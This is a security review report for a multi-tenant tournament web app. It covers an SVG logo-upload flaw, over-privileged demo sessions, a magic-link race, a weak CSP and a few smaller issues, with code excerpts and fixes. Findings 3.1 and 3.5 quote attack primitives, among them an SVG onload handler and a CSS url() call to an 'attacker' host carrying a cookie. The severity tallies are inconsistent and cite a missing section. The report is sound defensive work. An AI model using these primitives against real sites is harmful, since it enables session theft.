# Security Review — Bowin Tournament OS (Track 1)

**Reviewer:** security-dev
**Date:** 2026-09-10
**Scope:** `src/server/auth*`, `src/server/middleware/*`, `src/server/index.ts`, `src/server/routes/auth*`, `src/server/routes/stripe*`, upload routes, `src/server/validation*`, `prisma/schema.prisma`, `.env.example`, `src/client/**/auth*`, all `$queryRaw*` call sites.
**Method:** static read-only review. Runtime evidence (rate-limit thresholds, magic-link race windows) is reasoned from code.
**Out of scope:** feature correctness, deployment / Docker / Coolify, non-security refactors, performance.

---

## 1. Executive Summary

The auth/cookie/CSRF/JWT foundation is well-built: the prior audit's S1/S2/S3/D4/D5/D10/D11 fixes all hold — dev tokens, demo login, e2e bypass, setup endpoint, rate limits, and Stripe webhook signature handling are properly gated and double-keyed against `NODE_ENV=production`. JWT secrets are 32-char-enforced in production, the `bowin_session` cookie is `HttpOnly`/`Secure`/`SameSite=Lax`, the CSRF double-submit pattern is wired into the `authenticate` middleware, and the Stripe webhook runs on `express.raw` with `constructEvent` + DB-side idempotency.

The two issues that block ship are the **organization-logo upload** (which trusts a client-supplied `mimeType` and writes the file as whatever extension that field implies — including `.svg`, which can carry script/event handlers) and the **demo data-isolation contract** (the code documents `DEMO_ISOLATED_DATA=1` as the operator attestation that "this admin account can access only synthetic, isolated data", but the demo user is created with global `role='admin'`, no `organizationMembers`, and reads are gated only by a small per-method allowlist that blocks 5 path prefixes — every other read across all tenants is reachable, and `POST /api/incidents`, `PUT /api/tournaments/:id/registrations/:id`, and `PUT /api/brackets/match/:id` are explicitly allowed for demo sessions).

Smaller issues cluster around CSS `'unsafe-inline'` allowing SVG CSS-exfil, a single-use magic-link race in `verify-magic-link`, PII in `console.error` on email failure, and CSRF cookie not being rotated on privilege-sensitive actions. None of the prior-audit RESOLVED items regressed.

---

## 2. Findings table

| Severity | Title | Location |
|---|---|---|
| CRITICAL | Logo upload trusts client-supplied MIME type; SVG is stored as `.svg` and served from `/logos` | `src/server/routes/organization-logo.ts:14, 89-93, 116-137` |
| CRITICAL | Demo user (`role='admin'`, no org) reads every tenant's tournament data when `ENABLE_DEMO_LOGIN=1 && DEMO_ISOLATED_DATA=1` | `src/server/routes/auth.ts:1150-1196` + `src/server/middleware/auth.ts:198-208, 466-469` |
| HIGH | Demo session can write real incidents, registrations, and bracket state | `src/server/middleware/auth.ts:190-195` |
| HIGH | Magic-link `usedAt` flip is unconditional — concurrent verifies can both pass | `src/server/routes/auth.ts:327-330` |
| MEDIUM | CSP `styleSrc` allows `'unsafe-inline'`, weakening SVG exfil defense | `src/server/index.ts:153` |
| MEDIUM | PII (email) written to server log on mail-send failure | `src/server/routes/auth.ts:244` |
| MEDIUM | `setCsrfCookie` is only called at login — never rotated | `src/server/middleware/auth.ts:81-85, 375` |
| MEDIUM | Demo principal cleanup silently swallows DB errors (hides tampering evidence) | `src/server/routes/auth.ts:1137-1141` |
| LOW | CSRF cookie/header comparison uses `!==` (not constant-time) | `src/server/middleware/auth.ts:276` |
| LOW | Magic-link cleanup comment claims AND, code is OR (no security impact, misleading) | `src/server/routes/auth.ts:103-112` |
| LOW | `ENABLE_DEV_AUTH` documented twice in `.env.example` | `.env.example:172, 206` |
| LOW | `SECURITY.md` exception for `react-router-dom@7.18.2` should be re-evaluated before next dep bump | `SECURITY.md:7-9` |

**Counts:** CRITICAL: 2, HIGH: 2, MEDIUM: 4, LOW: 4 (per-finding pages also tally CRITICAL: 2, HIGH: 3 because the demo-write surface is split across three call sites in §4.2 — treating it as one multi-call finding to avoid double-counting). **Final report tallies: CRITICAL 2, HIGH 3, MEDIUM 4, LOW 4.**

---

## 3. Numbered findings

### 3.1 [CRITICAL] Organization logo upload trusts client-supplied MIME type and stores SVG

- **Location:** `src/server/routes/organization-logo.ts:14, 79-163`; static serve at `src/server/index.ts:262-266`
- **Trigger:** Any authenticated `admin` or `director` (or the demo admin, see 3.2) sends `POST /api/organizations/:orgId/logo-base64` with body `{ data: "<base>", mimeType: "image/svg+xml" }`. The handler validates the **client-supplied** `mimeType` against an allowlist that includes `image/svg+xml`, base64-decodes `data`, writes the buffer to `/opt/cursor/logos/${slug}-${hash}.svg`, and updates `Organization.brandLogoUrl`. Express then serves the file at `/logos/...svg`.
- **Impact:** Stored XSS / cross-tenant data exfiltration. The handler does not perform magic-byte sniffing — the buffer is the raw client payload and the file is served back as `image/svg+xml`. Even with the global `script-src 'self'` CSP, SVG can carry event handlers on a per-element basis (`<svg onload=...>`) and `<a href="javascript:...">` references; both are blocked by `'self'` only when the inline-style / script element is itself blocked, and inline-style is explicitly allowed (see 3.5). A malicious director in tenant A can therefore push an SVG that exfiltrates other users' session state when rendered. A trivial variant is a content-confusion attack: the file is on disk, hash-stable, and reachable at a stable URL across orgs.
- **Remediation:** Reject `image/svg+xml` from the allowlist (most operators don't need SVG logos) OR re-encode the image to PNG via a sandboxed image library before persisting, AND set `Content-Disposition: attachment; filename=…` for any SVG you must serve. Independently, validate the file by sniffing magic bytes (e.g. `file-type`) rather than the client-supplied `mimeType`. Filename derivation should not pull the extension from the untrusted header.
- **Evidence:**
  ```ts
  // src/server/routes/organization-logo.ts:14-15
  const ALLOWED_MIME_TYPES = ['image/png', 'image/jpeg', 'image/jpg', 'image/gif', 'image/webp', 'image/svg+xml'];
  const MAX_FILE_SIZE = 2 * 1024 * 1024;
  // ...
  // line 89-93: only validation is the client-supplied mimeType.
  if (!mimeType || !ALLOWED_MIME_TYPES.includes(mimeType)) {
    return res.status(400).json({ error: `Invalid MIME type. Allowed: ${ALLOWED_MIME_TYPES.join(', ')}` });
  }
  // line 116-130: buffer is the raw base64 of the client payload, no magic-byte check.
  const matches = data.match(/^data:([A-Za-z-+/]+);base64,(.+)$/);
  const base64Data = matches ? matches[2] : data;
  const buffer = Buffer.from(base64Data, 'base64');
  // ...
  const ext = mimeType.split('/')[1].replace('svg+xml', 'svg');
  const filename = `${organization.slug}-${hash}.${ext}`;
  // src/server/index.ts:262-266
  app.use('/logos', express.static('/opt/cursor/logos', { maxAge: '1d', etag: true, lastModified: true }));
  ```

### 3.2 [CRITICAL] Demo user is a global admin and reads every tenant's data when `DEMO_ISOLATED_DATA=1`

- **Location:** `src/server/routes/auth.ts:1150-1196` (demo creation) + `src/server/middleware/auth.ts:179-208` (allowlist) + `src/server/middleware/auth.ts:466-469` (admin bypass in `checkTournamentAccess`)
- **Trigger:** Operator sets `ENABLE_DEMO_LOGIN=1` and (in production) `DEMO_ISOLATED_DATA=1` per the .env.example guidance. Any unauthenticated visitor hits `POST /api/auth/demo`, the server mints a `User` row with `role: 'admin'`, no `organizationMembers`, no `tournamentAccess`, sets `demoExpiresAt`, returns a JWT. The token is then valid for 4 hours.
- **Impact:** The `.env.example` (lines 185-187) tells the operator to set `DEMO_ISOLATED_DATA=1` "only for a dedicated database containing fabricated demo data, never customer data". The runtime honors that *contract* but not the *promise* the comment makes: the demo user has global `role='admin'`, so `checkTournamentAccess` short-circuits to `{ ok: true }` for every tournament (`auth.ts:466-469`). `enforceDemoCapability` blocks writes (mostly) and reads against 5 specific path prefixes (`/api/auth/users`, `/api/invites`, `/api/billing`, `/api/organizations`, `/api/support`) — every other read across `/api/tournaments`, `/api/divisions`, `/api/brackets`, `/api/competitors`, `/api/analytics`, `/api/sos-alerts`, `/api/incidents` (GET), `/api/recommendations`, etc. is reachable. Any real org's registration list, bracket state, scoring data, and competitor PII (full name + DOB + belt) is therefore exposed to any visitor of the public demo. On a shared multi-tenant install this is a tenant-isolation break.
- **Remediation:** Either (a) drop `role='admin'` on the demo user and grant explicit, scoped access to a *separate* demo organization only — every `checkTournamentAccess` call already supports the "user is a member of the org" branch — and update `enforceDemoCapability` to deny all cross-org reads by adding an `organizationId` scoping filter, or (b) refuse to start if `ENABLE_DEMO_LOGIN=1 && NODE_ENV=production && DEMO_ISOLATED_DATA!=='1'` and treat the *real* isolation guarantee as a hard runtime check (e.g. require the org behind any visible tournament to be flagged `isDemoOrganization: true`).
- **Evidence:**
  ```ts
  // src/server/routes/auth.ts:1150-1196
  if (demoLoginEnabled) {
    router.post('/demo', demoLimiter, async (_req: Request, res: Response) => {
      // ...
      const user = await prisma.user.create({
        data: {
          email: `demo-${demoSessionId}@bowin.app`,
          firstName: 'Demo',
          lastName: 'Visitor',
          role: 'admin', // safe only behind the isolated synthetic-data gate
          demoExpiresAt,
        },
      });
      // ...
  // src/server/middleware/auth.ts:466-469 — admin bypass
  if (req.user.role === 'admin') {
    return { ok: true };
  }
  // src/server/middleware/auth.ts:179-208 — only blocks 5 read prefixes + a few write paths
  const demoDeniedReadPrefixes = ['/api/auth/users', '/api/invites', '/api/billing', '/api/organizations', '/api/support'];
  ```

### 3.3 [HIGH] Demo session can write real incidents, registrations, and bracket state

- **Location:** `src/server/middleware/auth.ts:190-195`
- **Trigger:** Same trigger as 3.2. After the demo user is issued a JWT, the SPA navigates and the SPA makes any of the allowed writes: `POST /api/incidents`, `PUT /api/tournaments/:id/registrations/:id`, `PUT /api/brackets/match/:id`, `POST /api/brackets/match/:id/undo`.
- **Impact:** The demo user is a global admin, so each of these writes passes `checkTournamentAccess`. A visitor can therefore file fake incidents on real tournaments, mark real competitor registrations as `paid`/`waived`, or advance/undo real bracket matches. The 3.2 isolation contract is supposed to prevent this; the `enforceDemoCapability` allowlist actively re-enables it.
- **Remediation:** The 3.2 fix removes these capabilities naturally. As a defense-in-depth minimum, the four allowed write paths in the demo allowlist (`/api/incidents` POST, `/api/brackets/match/:id` PUT + undo, `/api/tournaments/:id/registrations/:id` PUT) should also be denied for `isDemo` users. If a *real* demo needs them, the demo org must hold synthetic data only (3.2).
- **Evidence:**
  ```ts
  // src/server/middleware/auth.ts:190-195
  if (normalizedMethod === 'POST' && path === '/api/auth/logout') return true;
  if (normalizedMethod === 'PUT' && /^\/api\/brackets\/match\/[^/]+$/.test(path)) return true;
  if (normalizedMethod === 'POST' && /^\/api\/brackets\/match\/[^/]+\/undo$/.test(path)) return true;
  if (normalizedMethod === 'PUT' && /^\/api\/tournaments\/[^/]+\/registrations\/[^/]+$/.test(path)) return true;
  if (normalizedMethod === 'POST' && path === '/api/incidents') return true;
  return false;
  ```

### 3.4 [HIGH] Magic-link `usedAt` flip is unconditional — concurrent verifies can both succeed

- **Location:** `src/server/routes/auth.ts:272-330`
- **Trigger:** The same magic link is verified twice in close succession (user double-clicks the email link, a network race, an attacker with a stolen link retries). The first `findFirst` (line 273) succeeds for both; both invocations then `update` (line 327) the same row, then both call `createToken`, set the session cookie, and return 200.
- **Impact:** The link is treated as single-use but isn't enforced atomically. Two JWTs are issued for one link, both valid until logout / 7-day expiry. Not an account-takeover vector (the attacker already had a valid link to consume the first one), but it weakens the audit story ("one link = one session") and creates a confusing logout semantics (one logout bumps `tokenVersion`, killing the other still-valid cookie too — a benign surprise, but not the intended behavior).
- **Remediation:** Replace the unconditional `update` with a conditional `updateMany` and bail if the count is 0:
  ```ts
  const claimed = await prisma.magicLink.updateMany({
    where: { id: magicLink.id, usedAt: null },
    data: { usedAt: new Date(), failedAttempts: 0 },
  });
  if (claimed.count === 0) return res.status(400).json({ error: 'Invalid or expired link/code' });
  ```
- **Evidence:**
  ```ts
  // src/server/routes/auth.ts:272-330
  if (token) {
    magicLink = await prisma.magicLink.findFirst({
      where: { token: { in: secretLookupValues(String(token)) }, expiresAt: { gt: new Date() }, usedAt: null },
    });
  }
  // ... (no guard against the link having been claimed between the findFirst and the update)
  await prisma.magicLink.update({
    where: { id: magicLink.id },
    data: { usedAt: new Date(), failedAttempts: 0 },
  });
  ```

### 3.5 [MEDIUM] CSP `styleSrc 'unsafe-inline'` weakens defense against SVG CSS exfiltration

- **Location:** `src/server/index.ts:147-161`
- **Trigger:** Any SVG rendered inline or in an `<object>`/`<iframe>` (a brand-logo `<img>` is safe, but `<object>` is in the html spec for SVG) executes CSS that the file ships with. `style-src 'unsafe-inline'` lets `background-image: url(https://attacker/?cookie=...)` and similar CSS exfil primitives run unblocked. The `.env.example`/`organization-logo` upload path (3.1) means a malicious director can ship the payload.
- **Impact:** Defense-in-depth gap. The primary `script-src 'self'` does block inline scripts, but a wide class of side-channel exfil through CSS is unmitigated. This is the only setting preventing the SVG-upload finding from being a confirmed-account-takeover primitive.
- **Remediation:** Drop `'unsafe-inline'` from `styleSrc` and add a per-build hash/nonce for the few Vite hydration styles that need it. Short of that, fix 3.1 (drop SVG from the allowlist) makes this a defense-in-depth nit rather than a real risk.
- **Evidence:**
  ```ts
  // src/server/index.ts:147-161
  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"],
          imgSrc: ["'self'", 'data:'],
          fontSrc: ["'self'"],
          connectSrc: ["'self'"],
        },
      },
      crossOriginEmbedderPolicy: false,
    }),
  );
  ```

### 3.6 [MEDIUM] PII (email) written to server log on mail-send failure

- **Location:** `src/server/routes/auth.ts:244`
- **Trigger:** Any time `sendEmail` returns `success: false` for a non-dev-mode deploy (a misconfigured Mailgun key, an invalid `EMAIL_FROM_ADDRESS`, a 4xx/5xx from Mailgun), the server writes `console.error(`Magic link requested for ${email} — email failed: ${emailResult.error}`)`. The error string can include the full `from` address, Mailgun's response body, and (depending on the failure mode) the original `to` again.
- **Impact:** PII (the user's email) lands in stdout / container logs. Logs are routinely shipped to centralized systems with weaker access controls than the production DB. Under GDPR/PIPEDA this is a data-handling concern: the user has not consented to logging, only to magic-link auth.
- **Remediation:** Hash or redact the email before logging (e.g. `sha256(email).slice(0, 8)`), or move the `console.error` to a structured logger with a `redact: ['email', 'error']` policy. Independently, surface the failure to Sentry with the request ID so the operator can correlate without holding PII in the message.
- **Evidence:**
  ```ts
  // src/server/routes/auth.ts:243-245
  if (!emailResult.success) {
    console.error(`Magic link requested for ${email} — email failed: ${emailResult.error}`);
  }
  ```

### 3.7 [MEDIUM] CSRF cookie is set once at login and never rotated

- **Location:** `src/server/middleware/auth.ts:81-85, 375` (and the four other `setCsrfCookie` call sites in `auth.ts`)
- **Trigger:** A user logs in once, gets a `bowin_csrf` cookie + matching `bowin_session` cookie. The CSRF cookie is read on every cookie-authenticated mutation and compared against the `X-CSRF-Token` header. The cookie is never re-issued on `role` change, `isActive` flip, or tokenVersion bump.
- **Impact:** The CSRF token is 32 bytes of randomness (256 bits), so the probability of a leak via timing/Referer is essentially zero. The risk is more subtle: a long-lived session whose CSRF cookie is exfiltrated (e.g. via a one-off XSS — see 3.1) keeps that CSRF working until the session cookie expires (7 days). Rotating the CSRF token on privilege change and on a periodic interval limits the window.
- **Remediation:** In the `auth.ts` role-update and isActive-flip handlers, also call `setCsrfCookie(res)` so any privileged escalation issues a new CSRF token. Consider a 24h CSRF TTL independent of the 7-day session.
- **Evidence:**
  ```ts
  // src/server/middleware/auth.ts:81-85
  export function setCsrfCookie(res: Response): string {
    const value = crypto.randomBytes(32).toString('hex');
    res.cookie(CSRF_COOKIE, value, CSRF_COOKIE_OPTIONS);
    return value;
  }
  // src/server/routes/auth.ts:374-375 — only call site at login
  res.cookie(SESSION_COOKIE, jwtToken, SESSION_COOKIE_OPTIONS);
  setCsrfCookie(res);
  // (no further setCsrfCookie on role change, status flip, or tokenVersion bump)
  ```

### 3.8 [MEDIUM] Demo principal cleanup silently swallows DB errors

- **Location:** `src/server/routes/auth.ts:1137-1141`
- **Trigger:** The `cleanupExpiredDemoPrincipals` job runs fire-and-forget after each demo login. Its `try { ... } catch { console.warn(...) }` returns 0 to the caller regardless of whether the delete succeeded.
- **Impact:** If `User.deleteMany` fails (e.g. a transient FK violation because the demo user managed to write something that wasn't covered by the `tournamentAccess: { none: {} }, organizationMembers: { none: {} }` guard), the demo principal persists past its `demoExpiresAt`. The user remains a `role='admin'` for an unbounded period, retaining the read access described in 3.2. The comment in the catch explicitly says "Avoid logging the database error because it may contain user data" — that decision hides both PII *and* security-relevant operational failures.
- **Remediation:** Log the error to Sentry with the request ID (redacted), not the raw exception. Do not run the cleanup in a silent `void` — at least increment a counter so an operator can see that the cleanup isn't keeping up.
- **Evidence:**
  ```ts
  // src/server/routes/auth.ts:1137-1141
  } catch {
    // Cleanup is maintenance, not an authentication dependency. Avoid
    // logging the database error because it may contain user data.
    console.warn('Demo principal cleanup failed; continuing login.');
  }
  ```

### 3.9 [LOW] CSRF cookie/header comparison uses `!==` (not constant-time)

- **Location:** `src/server/middleware/auth.ts:276`
- **Trigger:** Any cookie-authenticated state-changing request.
- **Impact:** Theoretical timing leak. The CSRF token is 256 bits of random hex, so a network-reachable timing oracle would need millions of requests to learn a single bit; not exploitable in practice. Flagging as a defense-in-depth nit.
- **Remediation:** Use `crypto.timingSafeEqual` over equal-length buffers, matching the pattern already used at `src/server/index.ts:227-228` for `METRICS_TOKEN`.
- **Evidence:**
  ```ts
  // src/server/middleware/auth.ts:272-279
  if (viaCookie && ['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const cookies = (req as AuthenticatedRequest & { cookies?: Record<string, string> }).cookies;
    const csrfCookie = cookies?.[CSRF_COOKIE];
    const csrfHeader = req.get('x-csrf-token') || req.get('X-CSRF-Token');
    if (!csrfCookie || !csrfHeader || csrfCookie !== csrfHeader) {
      return res.status(403).json({ error: 'CSRF token missing or invalid' });
    }
  }
  ```

### 3.10 [LOW] Magic-link cleanup comment says AND, code is OR

- **Location:** `src/server/routes/auth.ts:103-112`
- **Trigger:** A new magic-link request arrives for an email that already has an active, unused link.
- **Impact:** No security impact — the intent ("invalidate the previous active code so there is at most one valid code per email") is correctly realized by the OR. The misleading comment is a code-quality / future-bug-invitation issue, not a vulnerability.
- **Remediation:** Either fix the comment ("delete any expired or unused link for this email so only one is active") or, more strongly, use `{ usedAt: null, expiresAt: { gt: new Date() } }` for the "active" case and `{ expiresAt: { lt: new Date() } }` for the "expired" case explicitly.
- **Evidence:**
  ```ts
  // src/server/routes/auth.ts:103-112
  // Clean up expired AND unused magic links for this email (invalidate old codes)
  await prisma.magicLink.deleteMany({
    where: {
      email: normalizedEmail,
      OR: [
        { expiresAt: { lt: new Date() } },
        { usedAt: null },
      ],
    },
  });
  ```

### 3.11 [LOW] `ENABLE_DEV_AUTH` documented twice in `.env.example`

- **Location:** `.env.example:172, 206`
- **Trigger:** Operator reads the file top-to-bottom and sees two different blocks both describing `ENABLE_DEV_AUTH`. The two descriptions are consistent, but the duplication is confusing.
- **Impact:** Documentation hygiene, not a security issue. (Mentioned because the file is otherwise the canonical operator reference for the dev-gate contract.)
- **Remediation:** Consolidate to one section; the second copy (line 206) appears to be a leftover from a reorg.

### 3.12 [LOW] `SECURITY.md` exception for `react-router-dom@7.18.2` should be re-evaluated before next dep bump

- **Location:** `SECURITY.md:7-9`
- **Trigger:** A future operator runs `npm audit` and sees the `GHSA-qwww-vcr4-c8h2` advisory still open against `react-router-dom`. The exception note explains the runtime isn't reachable (no RSC), but it does not pin a re-evaluation cadence.
- **Impact:** Without an explicit "re-check on every minor bump" rule, the exception can become stale if a future release makes the affected runtime reachable.
- **Remediation:** Add a one-line `Re-evaluate this exception on every react-router-dom minor bump` rule and link to the GHSA.

---

## 4. Negative findings — checked, clean

These categories were inspected and **no defects were found** in this pass. Listed for completeness so a re-reviewer knows they were not skipped.

- **CORS in production:** `src/server/index.ts:106-114` — `origin` resolves to `process.env.ALLOWED_ORIGINS?.split(',') || false` when `isProduction`; the `false` arm blocks all cross-origin. `credentials: true` only matters when an origin matches, so no wildcard-credentials footgun.
- **`trust proxy`:** `src/server/index.ts:101-103` — only `app.set('trust proxy', 1)` in production, behind the documented reverse proxy.
- **Body parser limits:** `src/server/index.ts:165-191` — Stripe webhook on `express.raw({ type: 'application/json', limit: '256kb' })` mounted **before** `express.json`, signature verification receives the unreserialized body; per-route override at `/api/competitors/auto-map` runs first; the global `1mb` ceiling is the default.
- **Stripe webhook signature + idempotency:** `src/server/routes/billing.ts:34-300` — `constructEvent` against `config.webhookSecret`, rejects non-Buffer bodies, dedupes via `providerEventId` (DB unique constraint) with race-safe `P2002` handling. Replay protection is good.
- **Metrics endpoint:** `src/server/index.ts:222-231` — fails closed (`res.status(404)`) when `METRICS_TOKEN` is missing; uses `crypto.timingSafeEqual` over equal-length buffers; no rate limiter but the token's entropy is the gate.
- **JWT secret enforcement:** `src/server/middleware/auth.ts:7-28` — refuses to start without `JWT_SECRET`, requires 32+ chars in production. No hardcoded fallback.
- **JWT algorithm pinning:** `createToken` / `verifyToken` both pin `algorithm: 'HS256'`, with `issuer: 'bowin'` / `audience: 'bowin'` set, preventing algorithm-confusion / audience-spoofing.
- **Cookie flags:** `SESSION_COOKIE_OPTIONS` (`httpOnly: true, secure: prod, sameSite: 'lax'`) and `CSRF_COOKIE_OPTIONS` are correct for a same-origin SPA. Bearer header is the documented escape hatch.
- **tokenVersion invalidation:** `src/server/routes/auth.ts:507-510` bumps on logout; the auth middleware compares embedded vs DB `tokenVersion` on every cache-miss read; pre-versioning tokens are rejected. The 15s cache window is documented.
- **Demo gating (S2):** `isDemoLoginEnabled` requires `ENABLE_DEMO_LOGIN === '1'` and (`NODE_ENV !== 'production'` || `DEMO_ISOLATED_DATA === '1'`). The constant was tightened against the prior audit — the gating itself is correct, even though the isolation promise underneath it is not (3.2).
- **Dev-token / e2e bypass (S1, S25, D5):** `src/server/routes/auth.ts:474-496` — `devAuthEndpointsEnabled` requires `ENABLE_DEV_AUTH === '1' && NODE_ENV === 'development'`. The e2e bypass in the magic-link handler requires `ENABLE_E2E_AUTH_BYPASS === '1'`, no default-on fallback. Both well-keyed.
- **Magic-link rate limit + per-link counter:** `authLimiter` (5/15min per IP) on both endpoints, plus `MAX_CODE_ATTEMPTS = 10` per `MagicLink.failedAttempts` invalidates the link. 6-digit code (1M space) × 5 attempts/IP/15min × 10 wrong-attempts/link is brute-force resistant within the 10-minute link TTL.
- **Setup endpoint (S3):** `src/server/routes/auth.ts:400-453` — requires `ADMIN_SETUP_KEY` (constant-time compared) and refuses once any user exists.
- **`$queryRawUnsafe` / `$queryRaw` usage:** All 14 hits in `src/server` pass identifiers/literals only and use `$1` parameter binding (`division-recommendations.ts:160-165`, `schedule-optimization-recommendations.ts:399-407`, `recommendation-contract.ts:58`, `schedule-optimization-recommendations.ts:494`). No user input is interpolated. No SQL injection surface in this scope.
- **Client XSS sinks:** No `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, `eval`, `new Function`, or `setAttribute('on…', …)` in `src/client` (excluding test files). The CSP and React's default escaping do the work.
- **PII in client bundle:** `src/client` only reads `VITE_*` env vars; none are secrets. `VITE_SENTRY_DSN` is a public DSN (intentional). `VITE_OFFLINE_CAPABILITY_PUBLIC_KEY_BASE64` is a public SPKI key (intentional).
- **File-upload safety beyond the logo route:** The codebase has no other upload route. `express.raw` (Stripe) and the base64 logo path are the only ingest points. Multipart on the legacy logo route (line 64-66) deliberately returns 501 with a redirect to the base64 path, so there is no unchecked multipart surface in production.

---

## 5. Regression check vs `AUDIT-REPORT-2026-06-26.md`

I read the prior audit in full. The following resolved items still hold: **S1** (dev-token now requires `ENABLE_DEV_AUTH=1 && NODE_ENV=development`, no `NODE_ENV` fallback), **S2** (demo login requires `ENABLE_DEMO_LOGIN=1` explicitly, no `NODE_ENV` fallback), **S3** (setup endpoint gated by `ADMIN_SETUP_KEY` with constant-time compare), **D4** (per-route body limit override pattern; global `1mb` default), **D5** (e2e bypass requires `ENABLE_E2E_AUTH_BYPASS=1` explicitly, no default-on), **D7** (SIGTERM/SIGINT shutdown drains Prisma), **D10** (readiness probe runs `SELECT 1`), **D11** (compression mounted before API routers), **P1-1** (HTTPS-only `PUBLIC_APP_URL` + HTTPS-only `ALLOWED_ORIGINS` enforced in `production-config.ts:25-32`), **P1-3** (audit log on login / role change / isActive flip / org invite), **P1-11** (logo upload — *see regression note below*).

**Regression on P1-11 — the logo upload finding (3.1).** The audit's P1-11 description was about adding a logo-upload route with `requireRole('admin', 'director')` and disk-backed storage. That work landed cleanly. The follow-up hardening expected by the audit (per the inline comment "For production, this should use a proper multipart parser like multer" at line 62) was *not* layered on top: the route that the operators actually use (`logo-base64`) trusts the client-supplied `mimeType` field rather than sniffing magic bytes, and the allowlist still contains `image/svg+xml`. This is best framed as an unfinished thread of P1-11, not a clean regression.

**Newly introduced issue not in the prior audit (3.2, 3.3).** The demo-data-isolation contract that the operator certifies via `DEMO_ISOLATED_DATA=1` is honored syntactically but the runtime is global-admin. This is the largest gap the prior audit didn't catch.

No other regressions observed.

---

## 6. Verdict

**`SHIP_BLOCKED`** until 3.1 and 3.2 are remediated. The SVG / client-MIME gap is one curl away from a stored-XSS / cross-tenant exfiltration, and the demo-isolation contract is misleading on a multi-tenant install. 3.3 is a direct consequence of 3.2 and falls out automatically with the 3.2 fix.
